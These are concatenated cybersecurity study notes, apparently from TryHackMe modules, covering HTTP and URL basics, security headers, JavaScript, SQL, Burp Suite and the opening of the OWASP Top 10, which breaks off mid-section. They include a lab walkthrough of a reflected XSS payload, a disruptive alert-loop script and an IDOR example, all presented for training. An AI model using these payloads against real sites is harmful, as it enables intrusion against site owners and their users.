# Web Application Basics

> **Analogy:** Think of a web application as a planet. Users (astronauts) explore its *surface* (front end) with a browser, while most activity happens *below the surface* (back end: servers, databases, networking, and security).

---

## Table of Contents
- [Web Application Overview](#web-application-overview)
  - [Front End](#front-end)
    - [HTML](#html)
    - [CSS](#css)
    - [JavaScript](#javascript)
  - [Back End](#back-end)
    - [Database](#database)
    - [Infrastructure](#infrastructure)
    - [Web Application Firewall (WAF)](#web-application-firewall-waf)
- [Uniform Resource Locator (URL)](#uniform-resource-locator-url)
  - [Anatomy of a URL](#anatomy-of-a-url)
- [HTTP Messages](#http-messages)
  - [Request vs Response](#request-vs-response)
  - [Message Structure](#message-structure)
- [HTTP Request: Line and Methods](#http-request-line-and-methods)
  - [HTTP Methods](#http-methods)
  - [URL Path](#url-path)
  - [HTTP Versions](#http-versions)
- [HTTP Requests: Headers and Bodies](#http-requests-headers-and-bodies)
  - [Common Request Headers](#common-request-headers)
  - [Request Bodies and Formats](#request-bodies-and-formats)
- [HTTP Response: Status Line and Status Codes](#http-response-status-line-and-status-codes)
  - [Common Status Codes](#common-status-codes)
- [HTTP Response: Headers and Body](#http-response-headers-and-body)
  - [Required Response Headers](#required-response-headers)
  - [Other Common Response Headers](#other-common-response-headers)
- [Security Headers](#security-headers)
  - [Content-Security-Policy (CSP)](#content-security-policy-csp)
  - [Strict-Transport-Security (HSTS)](#strict-transport-security-hsts)
  - [X-Content-Type-Options](#x-content-type-options)
  - [Referrer-Policy](#referrer-policy)

---

## Web Application Overview

A web application has two major sides:

- **Front End (Client-side):** What the user sees and interacts with in the browser.
- **Back End (Server-side):** Logic, data storage, and infrastructure users don’t see but that power the app.

### Front End

The front end is the *surface of the planet*—the visible, interactive layer. It’s built with:

#### HTML
**HyperText Markup Language** defines the structure and content of a page. Think of it as DNA-like instructions that tell the browser what to display.

#### CSS
**Cascading Style Sheets** control presentation and layout—colors, fonts, spacing, and responsive design.

#### JavaScript
**JavaScript (JS)** adds interactivity and logic in the browser—form validation, dynamic content updates, and client-side decisions.

### Back End

The back end is everything under the surface that makes the application function.

#### Database
Stores, modifies, and retrieves data (e.g., user profiles, preferences, transactions).

#### Infrastructure
Servers, application servers, storage, and networking that deliver and scale the application.

#### Web Application Firewall (WAF)
Optional security layer that filters/blocks malicious traffic before it reaches the application.

---

## Uniform Resource Locator (URL)

A **URL** is the address for resources on the web (pages, APIs, media). Understanding its parts helps with development, debugging, and security.

### Anatomy of a URL

```
scheme://user@host:port/path?query#fragment
```

- **Scheme:** Protocol (`http`, `https`). Prefer `https` for encryption and integrity.
- **User:** (Rare today) Credentials in the URL. Avoid due to security risk.
- **Host/Domain:** The website address. Watch for *typosquatting* in security contexts.
- **Port:** Service port (common: `80` for HTTP, `443` for HTTPS).
- **Path:** The resource location on the server (e.g., `/api/users/123`).
- **Query String:** Key–value pairs after `?` used for filters/search (`?q=search`). Validate/sanitize to prevent injection.
- **Fragment:** Client-side anchor after `#` used to jump within a page. Also input—treat carefully if processed by scripts.

---

## HTTP Messages

Two types of messages are exchanged between client and server:

- **HTTP Requests:** Sent by the client to trigger actions.
- **HTTP Responses:** Sent by the server with results.

### Message Structure

Each HTTP message has:

1. **Start Line** – Request line or status line.
2. **Headers** – Key–value metadata and instructions.
3. **Empty Line** – Separator.
4. **Body** – Optional payload (form data, JSON, HTML, etc.).

---

## HTTP Request: Line and Methods

**Request Line:**

```
METHOD /path HTTP/version
```

### HTTP Methods

- **GET** – Retrieve data (idempotent). Avoid sensitive data in URLs.
- **POST** – Create or submit data. Validate and sanitize inputs.
- **PUT** – Replace/update a resource. Enforce authorization.
- **DELETE** – Remove a resource. Enforce authorization.
- **PATCH** – Partial update. Validate semantics and input.
- **HEAD** – Headers only (like GET without body).
- **OPTIONS** – Supported methods/CORS preflight.
- **TRACE** – Diagnostic echo (often disabled for security).
- **CONNECT** – Establish a tunnel (e.g., HTTPS proxies).

### URL Path

The path identifies the resource (`/api/users/123`). Validate/sanitize paths and enforce authorization to prevent traversal and IDOR-style issues.

### HTTP Versions

- **HTTP/0.9 (1991):** GET only.
- **HTTP/1.0 (1996):** Headers, content types, basic caching.
- **HTTP/1.1 (1997):** Persistent connections, chunking, better caching (still very common).
- **HTTP/2 (2015):** Multiplexing, header compression, prioritization (faster).
- **HTTP/3 (2022):** Uses QUIC for reduced latency and improved reliability.

> Upgrading to HTTP/2 or HTTP/3 can yield performance and security improvements when supported.

---

## HTTP Requests: Headers and Bodies

### Common Request Headers

| Header       | Example                                           | Description                                                       |
|--------------|---------------------------------------------------|-------------------------------------------------------------------|
| `Host`       | `Host: tryhackme.com`                             | Target virtual host / server name.                                |
| `User-Agent` | `User-Agent: Mozilla/5.0`                         | Client software identification.                                    |
| `Referer`    | `Referer: https://www.google.com/`                | Page that linked to the requested resource.                       |
| `Cookie`     | `Cookie: user_type=student; room_status=active`   | Stored key–value pairs sent back to the server.                   |
| `Content-Type` | `Content-Type: application/json`               | Media type of the request body.                                   |

### Request Bodies and Formats

**URL Encoded (`application/x-www-form-urlencoded`)**

```
POST /profile HTTP/1.1
Host: tryhackme.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

name=Aleksandra&age=27&country=US
```

**Form Data (`multipart/form-data`)** — used for files/binary data

```
POST /upload HTTP/1.1
Host: tryhackme.com
User-Agent: Mozilla/5.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="username"

aleksandra
----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="profile_pic"; filename="aleksandra.jpg"
Content-Type: image/jpeg

[binary data...]
----WebKitFormBoundary7MA4YWxkTrZu0gW--
```

**JSON (`application/json`)**

```http
POST /api/user HTTP/1.1
Host: tryhackme.com
User-Agent: Mozilla/5.0
Content-Type: application/json
Content-Length: 62

{
  "name": "Aleksandra",
  "age": 27,
  "country": "US"
}
```

**XML (`application/xml`)**

```http
POST /api/user HTTP/1.1
Host: tryhackme.com
User-Agent: Mozilla/5.0
Content-Type: application/xml
Content-Length: 124

<user>
  <name>Aleksandra</name>
  <age>27</age>
  <country>US</country>
</user>
```

---

## HTTP Response: Status Line and Status Codes

**Status Line:**

```
HTTP/version status-code reason-phrase
```

Categories:

- **1xx Informational** – Request received; continue.
- **2xx Success** – Request processed successfully.
- **3xx Redirection** – Further action (often new location).
- **4xx Client Error** – Problem with the request.
- **5xx Server Error** – Server failed to process request.

### Common Status Codes

- `100 Continue` – Server ready for the rest of the request.
- `200 OK` – Successful request.
- `301 Moved Permanently` – Resource relocated to a new URL.
- `404 Not Found` – Resource does not exist at the given path.
- `500 Internal Server Error` – Generic server-side error.

---

## HTTP Response: Headers and Body

### Required Response Headers

- **Date:** e.g., `Date: Fri, 23 Aug 2024 10:43:21 GMT`  
  When the response was generated.

- **Content-Type:** e.g., `Content-Type: text/html; charset=utf-8`  
  Media type and character set of the body.

- **Server:** e.g., `Server: nginx`  
  Software handling the request (often obfuscated for security).

### Other Common Response Headers

- **Set-Cookie:** e.g., `Set-Cookie: sessionId=38af1337es7a8; Secure; HttpOnly`  
  Sends cookies to the client. Prefer `Secure` and `HttpOnly`.

- **Cache-Control:** e.g., `Cache-Control: max-age=600`  
  Controls caching behavior; use `no-store`/`no-cache` for sensitive data.

- **Location:** e.g., `Location: /index.html`  
  Target URL for redirects (validate to avoid open redirect issues).

**Response Body:** The actual data returned (HTML, JSON, images, etc.). Sanitize/escape user-generated data to prevent **XSS** and other injection attacks.

---

## Security Headers

### Content-Security-Policy (CSP)

Limit where resources (scripts, styles, images) can load from to mitigate XSS and data injection.

**Example:**

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.tryhackme.com; style-src 'self'
```

- `default-src 'self'` – Only same-origin by default.
- `script-src` – Allowed script sources (self + trusted CDN).
- `style-src` – Allowed stylesheet sources.

### Strict-Transport-Security (HSTS)

Forces HTTPS for a duration; can opt-in subdomains and preload lists.

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

- `max-age` – Seconds for enforcement.
- `includeSubDomains` – Apply to all subdomains.
- `preload` – Eligible for browser preload lists.

### X-Content-Type-Options

Prevents MIME type sniffing.

```
X-Content-Type-Options: nosniff
```

- `nosniff` – Instructs browsers to trust `Content-Type` only.

### Referrer-Policy

Controls how much referrer info is sent on navigation/requests.

```
Referrer-Policy: no-referrer
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
```

- `no-referrer` – Send nothing.
- `same-origin` – Only for same-origin requests.
- `strict-origin` – Send only the origin, and only over same scheme (HTTPS→HTTPS).
- `strict-origin-when-cross-origin` – Full URL for same-origin; origin only for cross-origin.

---

## Summary

- **Front End:** HTML, CSS, JS create the user experience.
- **Back End:** Servers, databases, infrastructure, and optional WAF power and protect the app.
- **URLs & HTTP:** Understanding URL anatomy and HTTP messages is foundational for building, debugging, and securing apps.
- **Security:** Apply security headers (CSP, HSTS, X-Content-Type-Options, Referrer-Policy) and validate/sanitize inputs and outputs.

> Use tools like `securityheaders.io` to analyze real sites and practice reviewing configurations.

# JavaScript Essentials

## Summary
This document contains structured notes from the **JavaScript Essentials** module. It covers core JavaScript concepts such as variables, data types, functions, loops, control flow, integration with HTML, dialogue functions, minification, obfuscation, and best practices for security.

---

## Table of Contents
1. [Introduction](#introduction)
2. [Essential Concepts](#essential-concepts)
   - [Variables](#variables)
   - [Data Types](#data-types)
   - [Functions](#functions)
   - [Loops](#loops)
   - [Request-Response Cycle](#request-response-cycle)
3. [JavaScript Overview](#javascript-overview)
4. [Integrating JavaScript with HTML](#integrating-javascript-with-html)
   - [Internal JavaScript](#internal-javascript)
   - [External JavaScript](#external-javascript)
   - [Verifying Internal or External JS](#verifying-internal-or-external-js)
5. [Abusing Dialogue Functions](#abusing-dialogue-functions)
   - [Alert](#alert)
   - [Prompt](#prompt)
   - [Confirm](#confirm)
   - [How Hackers Exploit the Functionality](#how-hackers-exploit-the-functionality)
6. [Bypassing Control Flow Statements](#bypassing-control-flow-statements)
7. [Exploring Minified Files](#exploring-minified-files)
   - [Deobfuscating a Code](#deobfuscating-a-code)
8. [Best Practices](#best-practices)
9. [Conclusion](#conclusion)

---

## Introduction
JavaScript (JS) is a popular scripting language that allows developers to add interactive features to websites containing HTML and CSS. It enables interactivity such as validation, onClick actions, and animations.

---

## Essential Concepts

### Variables
Variables store data values.  
- `var` → function-scoped  
- `let` → block-scoped  
- `const` → block-scoped, cannot be reassigned  

```javascript
let name = "Alice";
const pi = 3.14;
```

### Data Types
- `string` → text  
- `number` → numeric values  
- `boolean` → true/false  
- `null` → empty  
- `undefined` → variable declared but not assigned  
- `object` → arrays, objects, etc.

### Functions
Functions group reusable code.

```javascript
function PrintResult(rollNum) {
    alert("Username with roll number " + rollNum + " has passed the exam");
}
```

### Loops
Used to repeat tasks. Examples: `for`, `while`, `do...while`.

```javascript
for (let i = 0; i < 100; i++) {
    PrintResult(rollNumbers[i]);
}
```

### Request-Response Cycle
In web development, the browser (client) sends a request to a server, and the server responds with data or a webpage.

---

## JavaScript Overview
JS is an interpreted language executed in the browser.  

Example program:

```javascript
console.log("Hello, World!");

let age = 25;

if (age >= 18) {
    console.log("You are an adult.");
} else {
    console.log("You are a minor.");
}

function greet(name) {
    console.log("Hello, " + name + "!");
}

greet("Bob");
```

---

## Integrating JavaScript with HTML

### Internal JavaScript
Placed inside `<script>` tags within an HTML file.

```html
<script>
    alert("Hello from internal JS!");
</script>
```

### External JavaScript
Stored in a `.js` file and linked with the `src` attribute.

```html
<script src="app.js"></script>
```

### Verifying Internal or External JS
Check page source:  
- Inline scripts → `<script>` without `src`  
- External scripts → `<script src="file.js"></script>`

---

## Abusing Dialogue Functions

### Alert
Displays messages.

```javascript
alert("Hello THM");
```

### Prompt
Asks for user input.

```javascript
let name = prompt("What is your name?");
```

### Confirm
Asks for confirmation.

```javascript
let proceed = confirm("Do you want to proceed?");
```

### How Hackers Exploit the Functionality
Malicious scripts can abuse alerts to disrupt users:

```html
<script>
    for (let i = 0; i < 500; i++) {
        alert("Hacked");
    }
</script>
```

---

## Bypassing Control Flow Statements
Example of an `if-else` conditional:

```html
<script>
    let age = prompt("What is your age?");
    if (age >= 18) {
        document.getElementById("message").innerHTML = "You are an adult.";
    } else {
        document.getElementById("message").innerHTML = "You are a minor.";
    }
</script>
```

---

## Exploring Minified Files

- **Minification**: Removes whitespace, comments, and shortens code for performance.  
- **Obfuscation**: Intentionally makes code hard to read by renaming variables, adding dummy code, etc.

### Deobfuscating a Code
Tools exist to reverse obfuscation and make code human-readable again.

---

## Best Practices
- Do not rely only on **client-side validation**. Always validate on the server.  
- Only include **trusted libraries**.  
- **Avoid hardcoding secrets**.  
- **Minify and obfuscate** code in production to reduce readability and size.

Bad Practice:

```javascript
const privateAPIKey = 'pk_TryHackMe-1337';
```

---

## Conclusion
JavaScript is a versatile and essential tool for web development.  
You’ve learned about:  
- Variables, data types, functions, loops, and control flow  
- Integration with HTML  
- Dialogue functions and potential abuse  
- Minification, obfuscation, and deobfuscation  
- Best practices for security and efficiency  
# SQL Fundamentals

> **Author:** CybersecBarista (David Olivares)  
> **Last updated:** 2025-09-19

A clean, GitHub‑ready summary of SQL fundamentals with examples you can copy/paste.  
Use the Table of Contents to jump around quickly.

---

## Table of Contents
- [Introduction](#introduction)
- [Databases 101](#databases-101)
  - [Introducing Databases](#introducing-databases)
  - [Different Types of Databases](#different-types-of-databases)
  - [Tables, Rows, and Columns](#tables-rows-and-columns)
  - [Primary and Foreign Keys](#primary-and-foreign-keys)
- [SQL](#sql)
  - [What is SQL?](#what-is-sql)
  - [Benefits of SQL & Relational Databases](#benefits-of-sql--relational-databases)
- [Database & Table Statements](#database--table-statements)
  - [CREATE DATABASE](#create-database)
  - [SHOW DATABASES](#show-databases)
  - [USE (Select Active DB)](#use-select-active-db)
  - [DROP DATABASE](#drop-database)
  - [CREATE TABLE](#create-table)
  - [SHOW TABLES](#show-tables)
  - [DESCRIBE / DESC](#describe--desc)
  - [ALTER TABLE](#alter-table)
  - [DROP TABLE](#drop-table)
- [CRUD Operations](#crud-operations)
  - [INSERT (Create)](#insert-create)
  - [SELECT (Read)](#select-read)
  - [UPDATE (Update)](#update-update)
  - [DELETE (Delete)](#delete-delete)
  - [CRUD Summary](#crud-summary)
- [Clauses](#clauses)
  - [DISTINCT](#distinct)
  - [GROUP BY](#group-by)
  - [ORDER BY (ASC/DESC)](#order-by-ascdesc)
  - [HAVING](#having)
- [Operators](#operators)
  - [Logical Operators](#logical-operators)
    - [LIKE](#like)
    - [AND](#and)
    - [OR](#or)
    - [NOT](#not)
    - [BETWEEN](#between)
  - [Comparison Operators](#comparison-operators)
    - [= (Equal)](#-equal)
    - [!= (Not Equal)](#-not-equal)
    - [< (Less Than)](#--less-than)
    - [> (Greater Than)](#--greater-than)
    - [<= and >=](#-and-)
- [Functions](#functions)
  - [String Functions](#string-functions)
    - [CONCAT](#concat)
    - [GROUP_CONCAT](#group_concat)
    - [SUBSTRING](#substring)
    - [LENGTH](#length)
  - [Aggregate Functions](#aggregate-functions)
    - [COUNT](#count)
    - [SUM](#sum)
    - [MAX](#max)
    - [MIN](#min)
- [Conclusion](#conclusion)
- [Quick Reference](#quick-reference)

---

## Introduction
Cyber security touches databases everywhere: web apps, SIEMs, auth/ACL systems, malware analysis, and more.  
Knowing SQL helps you:
- Understand & exploit SQL injection (offense)
- Investigate data quickly (defense)
- Implement access controls & constraints (hardening)

This guide walks the core concepts first, then hands‑on SQL.

---

## Databases 101

### Introducing Databases
A **database** is an organized store of structured information that is easy to access, manipulate, and analyze.

Common examples:
- User auth data (usernames, passwords/credentials)
- Social content (posts, comments, likes)
- Streaming history & recommendations

### Different Types of Databases
- **Relational (SQL):** Structured, tabular (tables/rows/columns). Supports **relationships** between tables.
- **Non‑Relational (NoSQL):** Non‑tabular (documents, key‑value, wide‑column, graphs). Flexible schema.

**Example NoSQL document (MongoDB‑style):**
```json
{
  "_id": "4556712cd2b2397ce1b47661",
  "name": { "first": "Thomas", "last": "Anderson" },
  "date_of_birth": "1964-09-02",
  "occupation": ["The One"],
  "steps_taken": 4738947387743977493
}
```

**When to choose what?**
- **Relational:** Consistent structure & high data integrity (e‑commerce, finance).
- **NoSQL:** Variable/heterogeneous data (social media content, logs at scale).

### Tables, Rows, and Columns
A **table** models a collection (e.g., `books`).  
- **Columns** define attributes (`id`, `name`, `published_date`) and their **data types** (e.g., `INT`, `VARCHAR`, `DATE`, etc.).  
- **Rows** are individual records.

### Primary and Foreign Keys
- **Primary Key (PK):** Unique identifier per row (e.g., `books.id`). One PK per table.
- **Foreign Key (FK):** Column(s) referencing a PK in another table (e.g., `books.author_id` → `authors.id`). Enables relationships & referential integrity.

---

## SQL

### What is SQL?
**SQL (Structured Query Language)** is the language for defining, querying, and manipulating data in **relational** databases via a DBMS (e.g., MySQL, MariaDB, PostgreSQL, Oracle, SQL Server).

### Benefits of SQL & Relational Databases
- **Fast** on large, well‑indexed datasets
- **Readable** (English‑like syntax)
- **Reliable** (schema, constraints, ACID properties)
- **Flexible** querying for analytics & operations

---

## Database & Table Statements

### CREATE DATABASE
```sql
CREATE DATABASE database_name;
CREATE DATABASE thm_bookmarket_db;
```

### SHOW DATABASES
```sql
SHOW DATABASES;
```

### USE (Select Active DB)
```sql
USE thm_bookmarket_db;
```

### DROP DATABASE
> ⚠️ Destructive!
```sql
DROP DATABASE database_name;
```

### CREATE TABLE
```sql
CREATE TABLE example_table_name (
  example_column1 DATA_TYPE,
  example_column2 DATA_TYPE,
  example_column3 DATA_TYPE
);

CREATE TABLE book_inventory (
  book_id INT AUTO_INCREMENT PRIMARY KEY,
  book_name VARCHAR(255) NOT NULL,
  publication_date DATE
);
```

### SHOW TABLES
```sql
SHOW TABLES;
```

### DESCRIBE / DESC
```sql
DESCRIBE book_inventory;
-- or
DESC book_inventory;
```

**Sample output**
```
+------------------+--------------+------+-----+---------+----------------+
| Field            | Type         | Null | Key | Default | Extra          |
+------------------+--------------+------+-----+---------+----------------+
| book_id          | int          | NO   | PRI | NULL    | auto_increment |
| book_name        | varchar(255) | NO   |     | NULL    |                |
| publication_date | date         | YES  |     | NULL    |                |
+------------------+--------------+------+-----+---------+----------------+
```

### ALTER TABLE
```sql
ALTER TABLE book_inventory
ADD page_count INT;
-- Also supports CHANGE/MODIFY, RENAME, DROP COLUMN, etc.
```

### DROP TABLE
> ⚠️ Destructive!
```sql
DROP TABLE table_name;
```

---

## CRUD Operations

> Using database: `thm_books`

### INSERT (Create)
```sql
INSERT INTO books (id, name, published_date, description)
VALUES (1, "Android Security Internals", "2014-10-14",
        "An In-Depth Guide to Android's Security Architecture");
```

### SELECT (Read)
All columns:
```sql
SELECT * FROM books;
```

Specific columns:
```sql
SELECT name, description FROM books;
```

### UPDATE (Update)
```sql
UPDATE books
SET description = "An In-Depth Guide to Android's Security Architecture."
WHERE id = 1;
```

### DELETE (Delete)
> ⚠️ Destructive!
```sql
DELETE FROM books WHERE id = 1;
```

### CRUD Summary
- **Create** → `INSERT`
- **Read** → `SELECT`
- **Update** → `UPDATE`
- **Delete** → `DELETE`

---

## Clauses

### DISTINCT
Return unique values:
```sql
SELECT DISTINCT name FROM books;
```

### GROUP BY
Aggregate and group rows:
```sql
SELECT name, COUNT(*)
FROM books
GROUP BY name;
```

### ORDER BY (ASC/DESC)
```sql
-- Ascending (oldest → newest)
SELECT * FROM books ORDER BY published_date ASC;

-- Descending (newest → oldest)
SELECT * FROM books ORDER BY published_date DESC;
```

### HAVING
Filter **after** aggregation (unlike `WHERE` which filters **before**):
```sql
SELECT name, COUNT(*)
FROM books
GROUP BY name
HAVING name LIKE '%Hack%';
```

---

## Operators

### Logical Operators

#### LIKE
Pattern match (often with `WHERE`):
```sql
SELECT *
FROM books
WHERE description LIKE "%guide%";
```

#### AND
All conditions must be true:
```sql
SELECT *
FROM books
WHERE category = "Offensive Security"
  AND name = "Bug Bounty Bootcamp";
```

#### OR
At least one condition true:
```sql
SELECT *
FROM books
WHERE name LIKE "%Android%" OR name LIKE "%iOS%";
```

#### NOT
Negate a condition:
```sql
SELECT *
FROM books
WHERE NOT description LIKE "%guide%";
```

#### BETWEEN
Inclusive range:
```sql
SELECT *
FROM books
WHERE id BETWEEN 2 AND 4;
```

### Comparison Operators

#### = (Equal)
```sql
SELECT *
FROM books
WHERE name = "Designing Secure Software";
```

#### != (Not Equal)
```sql
SELECT *
FROM books
WHERE category != "Offensive Security";
```

#### < (Less Than)
```sql
SELECT *
FROM books
WHERE published_date < "2020-01-01";
```

#### > (Greater Than)
```sql
SELECT *
FROM books
WHERE published_date > "2020-01-01";
```

#### <= and >=
```sql
-- On or before a date
SELECT * FROM books
WHERE published_date <= "2021-11-15";

-- On or after a date
SELECT * FROM books
WHERE published_date >= "2021-11-02";
```

---

## Functions

### String Functions

#### CONCAT
```sql
SELECT CONCAT(name, " is a type of ", category, " book.") AS book_info
FROM books;
```

#### GROUP_CONCAT
```sql
SELECT category, GROUP_CONCAT(name SEPARATOR ", ") AS books
FROM books
GROUP BY category;
```

#### SUBSTRING
```sql
SELECT SUBSTRING(published_date, 1, 4) AS published_year
FROM books;
```

#### LENGTH
```sql
SELECT LENGTH(name) AS name_length FROM books;
```

### Aggregate Functions

#### COUNT
```sql
SELECT COUNT(*) AS total_books FROM books;
```

#### SUM
```sql
SELECT SUM(price) AS total_price FROM books;
-- Sums non-NULL values in the price column
```

#### MAX
```sql
SELECT MAX(published_date) AS latest_book FROM books;
```

#### MIN
```sql
SELECT MIN(published_date) AS earliest_book FROM books;
```

---

## Conclusion
You covered:
- What databases are and where they show up in cyber
- Relational vs non‑relational tradeoffs
- Tables, rows, columns, PKs & FKs
- Core SQL for schema & data
- CRUD + key clauses, operators, and functions

Practice by writing small schemas and queries. Build muscle memory.

---

## Quick Reference

```sql
-- Databases
CREATE DATABASE db;
SHOW DATABASES;
USE db;
DROP DATABASE db;

-- Tables
CREATE TABLE t (...);
SHOW TABLES;
DESCRIBE t;
ALTER TABLE t ADD col TYPE;
DROP TABLE t;

-- CRUD
INSERT INTO t (a,b) VALUES (1,2);
SELECT col1, col2 FROM t WHERE ...;
UPDATE t SET col = val WHERE ...;
DELETE FROM t WHERE ...;

-- Clauses
SELECT DISTINCT col FROM t;
SELECT col, COUNT(*) FROM t GROUP BY col;
SELECT * FROM t ORDER BY col ASC;  -- or DESC
SELECT col, COUNT(*) FROM t GROUP BY col HAVING COUNT(*) > 1;

-- Operators
WHERE name LIKE '%text%';
WHERE a BETWEEN 10 AND 20;
WHERE cond1 AND (cond2 OR cond3);
WHERE NOT col = 'value';

-- Functions
SELECT CONCAT(a, b);
SELECT GROUP_CONCAT(name SEPARATOR ', ');
SELECT SUBSTRING(str, 1, 4);
SELECT LENGTH(str);
SELECT COUNT(*), SUM(x), MAX(x), MIN(x) FROM t;

```# Burp Suite: The Basics

## What is Burp Suite?
Burp Suite is a **Java-based framework** designed for web application penetration testing. It captures and manipulates all HTTP/HTTPS traffic between a browser and a web server.

**Key Points:**
- Intercept, view, and modify web requests and responses.
- Route requests to various Burp tools.
- Essential for manual web application testing.

**Editions:**
- **Community Edition**: Free, limited features, good for learning.
- **Professional Edition**: Paid, includes advanced features like:
  - Automated vulnerability scanner
  - Full-featured Intruder (fuzzer)
  - Project saving & report generation
  - Built-in API integrations
  - Burp Collaborator
- **Enterprise Edition**: Continuous automated scanning on servers.

---

## Features of Burp Community
Even with limited features, Community Edition includes:

- **Proxy**: Intercept and modify requests/responses.
- **Repeater**: Modify and resend requests.
- **Intruder**: Brute-force/fuzz endpoints (rate limited).
- **Decoder**: Encode/decode data.
- **Comparer**: Compare data at word/byte level.
- **Sequencer**: Analyze randomness of tokens (e.g., cookies).
- **Extender**: Load extensions (Java, Python via Jython, Ruby via JRuby).
- **BApp Store**: Download third-party modules (e.g., Logger++).

---

## The Dashboard
The dashboard is divided into four quadrants:

1. **Tasks** – Background tasks (Live Passive Crawl by default).
2. **Event Log** – Shows Burp actions and connections.
3. **Issue Activity** – Vulnerabilities found (Pro only).
4. **Advisory** – Details on vulnerabilities (Pro only).

💡 Click the **question mark icons** throughout the UI for contextual help.

---

## Navigation
- **Top Menu Bar**: Switch between modules.
- **Sub-tabs**: Module-specific options (e.g., Proxy → Intercept).
- **Detach Tabs**: `Window → Detach` opens tabs in separate windows.

**Keyboard Shortcuts:**
| Shortcut          | Tab       |
|-------------------|-----------|
| `Ctrl+Shift+D`    | Dashboard |
| `Ctrl+Shift+T`    | Target    |
| `Ctrl+Shift+P`    | Proxy     |
| `Ctrl+Shift+I`    | Intruder  |
| `Ctrl+Shift+R`    | Repeater  |

---

## Options
Two types of settings:
- **Global (User)** – Persist across sessions.
- **Project** – Session-specific (not saved in Community Edition).

Navigate via **Settings → Menu**:
- Search
- User vs Project filter
- Categories (e.g., Proxy, Browser, etc.)

---

## Burp Proxy
Intercepts and manipulates traffic.

**Key Features:**
- Intercept requests (`Intercept is on` button).
- Capture & log HTTP/S + WebSockets.
- View request history.

**Proxy Settings Highlights:**
- Response Interception rules
- Match & Replace (regex-based request/response modifications)

---

## Connecting through the Proxy (FoxyProxy)
Steps (Firefox example):
1. Install **FoxyProxy Basic**.
2. Add new proxy config:
   - Title: `Burp`
   - IP: `127.0.0.1`
   - Port: `8080`
3. Enable proxy & start Burp.
4. Test with a target URL (browser request intercepted).

⚠️ If **Intercept is on**, your browser will hang until the request is forwarded/dropped.

---

## Target Tab: SiteMap & Issue Definitions
- **Site Map**: Tree view of visited pages & endpoints.
- **Issue Definitions**: List of known vulnerabilities with descriptions.
- **Scope Settings**: Define target domains/IPs for cleaner captures.

---

## Burp Suite Browser
- Built-in Chromium browser, pre-configured for the proxy.
- **Settings**: Tools → Burp’s browser.
- Run in **sandbox mode** (recommended). Root users may need to disable sandbox (⚠️ less secure).

---

## Scoping & Targeting
- Add domains to scope (`Target → Right-click → Add to Scope`).
- Limit proxy interception: `Proxy → Intercept Client Requests → "And URL is in scope"`.

This keeps captures clean and focused.

---

## Proxying HTTPS
To handle TLS/SSL:
1. Go to [http://burp/cert](http://burp/cert).
2. Download `cacert.der`.
3. Import into Firefox:
   - Preferences → Certificates → View Certificates → Import.
   - Trust CA for websites.

Now HTTPS sites will proxy without certificate errors.

---

## Example Attack: Reflected XSS
**Target:** `http://MACHINE_IP/ticket/` form.

1. Intercept request with Burp Proxy.
2. Replace email field with XSS payload:  
   ```html
   <script>alert("Succ3ssful XSS")</script>
   ```
3. URL-encode payload (`Ctrl+U`).
4. Forward request.
5. Result: Pop-up alert → XSS successful!

---

## ✅ Summary
Burp Suite is the industry-standard framework for **manual web app penetration testing**.  
Community Edition provides the essentials, while Professional adds automation and enterprise-level features.  
Mastering **Proxy, Repeater, Intruder, and Scope management** is critical for real-world testing.

# OWASP Top 10 (2021) — TryHackMe Notes

> Formatted for GitHub. Clean headings, examples, code blocks, and quick remediation notes.

---
## Table of Contents
1. [Broken Access Control](#broken-access-control)
   - [Insecure Direct Object Reference (IDOR)](#insecure-direct-object-reference-idor)
2. [Cryptographic Failures](#cryptographic-failures)
   - [SQLite example](#sqlite-example)
   - [Cracking weak MD5 hashes (CrackStation)](#cracking-weak-md5-hashes-crackstation)
3. [Injection](#injection)
   - [SQL Injection](#sql-injection)
   - [Command Injection](#command-injection)
     - [PHP `passthru()` example](#php-passthru-example)
4. [Insecure Design](#insecure-design)
   - [Insecure Password Resets](#insecure-password-resets)
5. [Security Misconfiguration](#security-misconfiguration)
   - [Debugging Interfaces](#debugging-interfaces)
6. [Vulnerable and Outdated Components](#vulnerable-and-outdated-components)
   - [Nostromo 1.9.6 RCE example](#nostromo-196-rce-example)
7. [Authentication & Session Management](#authentication--session-management)
   - [Re-registration logic flaw example](#re-registration-logic-flaw-example)
8. [Identification & Cryptographic Integrity](#identification--cryptographic-integrity)
   - [Software Integrity Failures (SRI)](#software-integrity-failures-sri)
   - [Data Integrity Failures (JWT `none` attack)](#data-integrity-failures-jwt-none-attack)
9. [Logging & Monitoring](#logging--monitoring)
10. [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)

---

## Broken Access Control
**What it is:** Access controls restrict what authenticated and unauthenticated users can do. When these controls are missing or misconfigured, users can access pages or actions they should not.

**Impact examples:**
- View other users' sensitive data
- Access privileged functionality (admin pages)
- Perform unauthorized actions

**Real-world note:** 2019 example — an attacker could request single frames from a *private* YouTube video and reconstruct content. Private expectation was violated → broken access control.

### Typical causes
- Missing authorization checks on server-side endpoints
- Over-reliance on client-side checks (easily bypassed)
- Predictable URLs/IDs without ownership checks

### Quick mitigations
- Enforce server-side authorization checks for every request
- Apply least privilege: users see only what's necessary
- Use fail-safe defaults (deny unless explicitly allowed)
- Protect sensitive endpoints and APIs with proper role checks

---
### Insecure Direct Object Reference (IDOR)
**Definition:** IDOR occurs when an application exposes a direct reference (e.g., `?id=12345`) and does not verify that the requesting user owns/has access to that object.

**Example:** `https://bank.example/account?id=111111` — attacker increments `id` to `222222` and can view another user's bank details because ownership isn't validated.

**Fixes:**
- Always check object ownership server-side
- Use indirect references (random UUIDs, mapping tables) or ensure ACL checks
- Do not rely on security through obscurity (sequential IDs are weak)

---

## Cryptographic Failures
**What it is:** Misuse or missing use of cryptography that protects data in transit or at rest. Results in exposure of sensitive data or broken guarantees of confidentiality and integrity.

**Common failures:**
- Plaintext transport (no TLS)
- Weak hashing (unsalted MD5, SHA1)
- Secrets in code/config
- Reliance on client-side enforcement

**Example levels:** 
- **Data in transit:** TLS/HTTPS protects network traffic.
